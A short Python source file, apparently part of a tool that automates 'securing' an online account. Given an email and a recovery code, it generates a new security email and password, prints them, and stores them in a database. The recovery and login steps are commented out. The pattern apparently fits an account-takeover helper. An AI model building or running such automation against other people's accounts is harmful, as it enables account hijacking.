from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.getEmailCode import getEmailCode
from views.utils.securing.recovery import recover

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession
from views.utils.sendAuth import sendAuth

from database.database import DBConnection
import asyncio
import uuid

async def recoverySecure(email: str, recovery_code: str) -> dict:

    session = getSession()

    secEmail = uuid.uuid4().hex[:16]
    newPassword = uuid.uuid4().hex[:12]

    email_token, security_email = await generateEmail(secEmail, newPassword)
    print(f"[+] - Generated Security Email ({security_email}) and Password ({newPassword})")

    with DBConnection() as database:
        database.addEmail(security_email, newPassword)
    
    # print("[~] - Automaticly Securing Account...")
    # data = await recover(session, email, recovery_code, security_email, newPassword, email_token)
    # print(data)
    # if data == "invalid" or not data:
    #     return data

    # await loginPWD(session, email, password)

    # return account